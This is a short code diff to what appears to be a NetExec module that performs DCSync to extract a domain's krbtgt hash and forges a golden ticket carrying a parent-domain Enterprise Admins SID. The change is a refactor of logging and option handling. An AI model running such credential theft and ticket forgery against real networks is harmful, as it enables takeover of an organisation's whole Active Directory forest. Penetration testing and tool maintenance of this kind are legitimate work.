@@ -187,10 +187,10 @@ class NXCModule:
             smb_conn = self._get_smb_session(connection)
             self._dcsync_krbtgt(smb_conn, connection)
         except Exception as e:
-            self.context.log.fail(f"Error during DCSync : {e}")
+            self.context.log.fail(f"Error during DCSync: {e}")
             return
 
-        if hasattr(self, "krbtgt_hash") and self.krbtgt_hash:
+        if self.krbtgt_hash:
             try:
                 tgt = self.forge_golden_ticket(connection)
                 self.context.log.success(f"Golden ticket forged successfully. Saved to: {tgt}")
@@ -216,26 +216,12 @@ class NXCModule:
         Forge a golden ticket for the child domain using the krbtgt NT-hash.
         Supports optional USER, RID and USER_ID module options.
         """
-        # Normalize module_options to a plain dict
-        opts = {}
-        if self.module_options:
-            opts = (
-                vars(self.module_options)
-                if not isinstance(self.module_options, dict)
-                else self.module_options.copy()
-            )
-
-        default_admin = "Administrator"
-        admin_name = opts.get("USER", default_admin) or default_admin
-
         nthash = self._clean_nthash(self.krbtgt_hash)
 
-        default_extra = "519"
-        extra_rid = str(opts.get("RID", default_extra)) or default_extra
+        admin_name = self.module_options.get("USER", "Administrator")
+        extra_rid = str(self.module_options.get("RID", "519"))
         extra_sid = f"{self.parent_sid}-{extra_rid}"
-
-        default_user = "500"
-        user_rid = str(opts.get("USER_ID", default_user)) or default_user
+        user_rid = str(self.module_options.get("USER_ID", "500"))
 
         tick_opts = Namespace(
             request=False,  # offline mode
